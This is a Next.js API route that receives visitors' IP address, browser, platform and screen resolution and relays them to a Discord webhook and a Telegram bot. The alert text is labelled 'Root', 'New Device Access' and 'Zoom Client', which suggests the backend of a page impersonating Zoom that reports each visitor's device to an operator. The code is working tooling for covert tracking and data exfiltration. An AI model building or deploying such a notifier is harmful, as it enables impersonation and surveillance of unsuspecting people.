import { NextResponse } from "next/server";

async function sendDiscordMessage(webhookUrl, payload, retries = 3, delay = 5000) {
  for (let i = 0; i < retries; i++) {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout

      const res = await fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
        signal: controller.signal,
      });

      clearTimeout(timeoutId);

      if (!res.ok) {
        throw new Error(`Discord webhook error: ${res.status} - ${await res.text()}`);
      }

      if (res.status === 204) {
        return null;
      }

      try {
        return await res.json();
      } catch {
        return null;
      }
    } catch (error) {
      console.error(`Retry ${i + 1}/${retries} failed:`, error);
      if (i < retries - 1) {
        await new Promise((resolve) => setTimeout(resolve, delay));
      }
    }
  }
  throw new Error("Failed to send message to Discord after multiple attempts.");
}

export async function POST(req) {
  try {
    if (req.headers.get("content-type") !== "application/json") {
      return NextResponse.json({ error: "Invalid Content-Type" }, { status: 400 });
    }

    const body = await req.json();
    const { ip, browser, platform, screenWidth, screenHeight } = body;

    if (!ip || !browser || !platform) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 });
    }

    console.log("✅ Received device info:", body);

    const message = `🧛‍♂️ *Root*\n📢 *New Device Access*\n*Zoom Client*\n\n🌍 IP: ${ip}\n🖥 Platform: ${platform}\n🌐 Browser: ${browser}\n📏 Resolution: ${screenWidth}x${screenHeight}`;

    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;

    if (!webhookUrl && !(telegramBotToken && telegramChatId)) {
      console.error("Missing notification configurations: Neither Discord nor Telegram is set.");
      return NextResponse.json(
        { error: "Missing notification environment variables" },
        { status: 500 }
      );
    }

    const sendPromises = [];

    if (webhookUrl) {
      console.log("📡 Sending to Discord webhook...");
      sendPromises.push(
        sendDiscordMessage(webhookUrl, {
          content: message,
          allowed_mentions: { parse: [] },
        })
          .then((data) => {
            console.log("🔄 Discord webhook succeeded. Response:", data);
          })
          .catch((err) => {
            console.error("❌ Failed to send Discord notification:", err);
          })
      );
    }

    if (telegramBotToken && telegramChatId) {
      console.log("📡 Sending to Telegram bot...");
      const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
      const sendTelegram = async () => {
        let res = await fetch(telegramUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: telegramChatId,
            text: message,
            parse_mode: "Markdown",
          }),
        });
        if (!res.ok) {
          const errText = await res.text();
          console.warn(`Telegram markdown send failed: ${res.status} - ${errText}. Retrying without markdown parse_mode...`);
          res = await fetch(telegramUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: telegramChatId,
              text: message,
            }),
          });
          if (!res.ok) {
            throw new Error(`Telegram error: ${res.status} - ${await res.text()}`);
          }
        }
      };

      sendPromises.push(
        sendTelegram()
          .then(() => {
            console.log("🔄 Telegram notification succeeded.");
          })
          .catch((err) => {
            console.error("❌ Failed to send Telegram notification:", err);
          })
      );
    }

    await Promise.allSettled(sendPromises);

    return NextResponse.json({ success: true, message: "Notification process completed" }, { status: 200 });
  } catch (error) {
    console.error("❌ Error in Discord webhook route:", error);
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
